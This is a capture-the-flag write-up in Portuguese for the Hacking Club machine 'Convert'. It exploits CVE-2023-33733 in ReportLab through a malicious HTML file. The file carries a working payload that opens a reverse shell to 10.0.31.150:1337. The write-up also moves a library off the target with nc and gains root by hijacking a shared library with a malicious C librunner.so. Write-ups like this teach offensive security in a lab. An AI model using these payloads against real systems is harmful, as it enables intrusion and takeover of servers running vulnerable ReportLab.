@@ -1,0 +1,163 @@
+---
+title: 'Convert Writeup'
+date: '2024-11-17'
+tags: ['CVE-2023-33733', 'RCE', 'Linux']
+draft: false
+summary: 'Aplicação possui vulnerabilidades de execução remota de código (RCE) na biblioteca ReportLab e elevação de privilégios via "Shared Library Hijacking".'
+images: ['/static/images/convert-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/convert-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Convert
+
+---
+
+### **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 60:fc:05:85:35:18:5c:83:ff:aa:85:48:9b:6b:68:80 (ECDSA)
+|_  256 4e:88:0d:b1:27:e3:b4:9a:80:93:48:a0:d5:56:d7:2b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Convert HTML to PDF Online
+| http-methods:
+|_  Supported Methods: OPTIONS GET POST HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+---
+
+## Enumeration
+
+`http://172.16.9.251`
+
+Uma aplicação chamada Convert, que possui a funcionalidade de converter arquivos **HTML** para **PDF**.
+
+![convert](/static/images/convert-writeup-images/image.png)
+
+A aplicação possui um bloqueio, permitindo somente arquivos HTML sejam submetidos, tentei bypassar o filtro mas não obtive sucesso.
+
+![convert 1](/static/images/convert-writeup-images/image1.png)
+
+Após submeter um arquivo html qualquer, a aplicação converte para PDF.
+
+Depois de converter, podemos identificar com a ferramenta `exiftool` qual foi a ferramenta/biblioteca utilizada para realizar a conversão.
+
+![convert 2](/static/images/convert-writeup-images/image2.png)
+
+Com o nome do produtor em mãos, podemos verificar que existe uma CVE relacionada.
+
+![convert 3](/static/images/convert-writeup-images/image3.png)
+
+Para explorar `CVE-2023-33733` vamos mandar um arquivo `.html` malicioso, que vai nos gerar um RCE.
+
+https://github.com/c53elyas/CVE-2023-33733
+
+---
+
+## Foot Hold
+
+`evil.html`
+
+```jsx
+<para>
+  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('/bin/bash -c \'sh -i >& /dev/tcp/10.0.31.150/1337 0>&1\'') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+    exploit
+  </font>
+</para>
+```
+
+![convert 4](/static/images/convert-writeup-images/image4.png)
+
+`nc -lnvp 1337`
+
+![convert 5](/static/images/convert-writeup-images/image5.png)
+
+---
+
+## Privillege Escalation
+
+`find / -perm -u=s 2>/dev/null`
+
+![convert 6](/static/images/convert-writeup-images/image6.png)
+
+Ao acessar o diretório `binary` e executar o arquivo `ucount` que está como `SUID`, percebemos que ele retorna a contagem dos usuários do sistema.
+
+![convert 7](/static/images/convert-writeup-images/image7.png)
+
+Utilizando o comando strace , podemos confirmar que o arquivo está utilizando a biblioteca `librunner.so` , que está dentro do diretório `functions`
+
+![convert 8](/static/images/convert-writeup-images/image8.png)
+
+Com isso, a gente pode utilizar um técnica de Privillege Escalation conhecida como **Shared Library Hijacking**, criando nossa propria [`l](http://lbrunner.so)ibrunner.so`para ser executada pelo`SUID` `ucount`.
+
+Entretanto, nós não temos permissão de alterar a `librunner.so` diretamente, pois não temos permissão, mas o arquivo está na pasta do nosso usuário (flaskuser), e nela podemos alterar.
+
+```python
+mv binary/ binary2
+mkdir -p binary/functions
+```
+
+![convert 9](/static/images/convert-writeup-images/image9.png)
+
+Agora, iremos criar a nossa lib maliciosa para jogarmos dentro do da pasta que criamos.
+
+Pra isso, vamos mandar o `librunner.so` original para a nossa maquina e analisar melhor.
+
+```python
+#maquina atacante
+nc -lnvp 1234 > librunner.so
+#maquina alvo
+nc 10.0.31.150 1234 < librunner.so
+```
+
+![convert 10](/static/images/convert-writeup-images/image10.png)
+
+![convert 11](/static/images/convert-writeup-images/image11.png)
+
+Abrindo o arquivo no **Ghidra**, vemos que tem uma função chamada `isRoot` e é ela que vamos utilizar pra ganhar root no sistema.
+
+Edit: Foi mal galera, a print saiu cortada 😄
+
+![convert 12](/static/images/convert-writeup-images/image12.png)
+
+```C
+#include <stdlib.h>
+#include <unistd.h>
+
+void isRoot() {
+	setuid(0);
+	setgid(0);
+	system("/bin/bash -i");
+}
+
+void lineCounter() {
+}
+
+```
+
+`gcc -shared -fPIC -nostartfiles -o librunner.so librunner.c`
+
+![convert 13](/static/images/convert-writeup-images/image13.png)
+
+Agora só executar o SUID, que está localizado no diretório que criamos (binary2)
+
+![convert 14](/static/images/convert-writeup-images/image14.png)
+
+---
+
+## Proof
+
+![convert 15](/static/images/convert-writeup-images/image15.png)
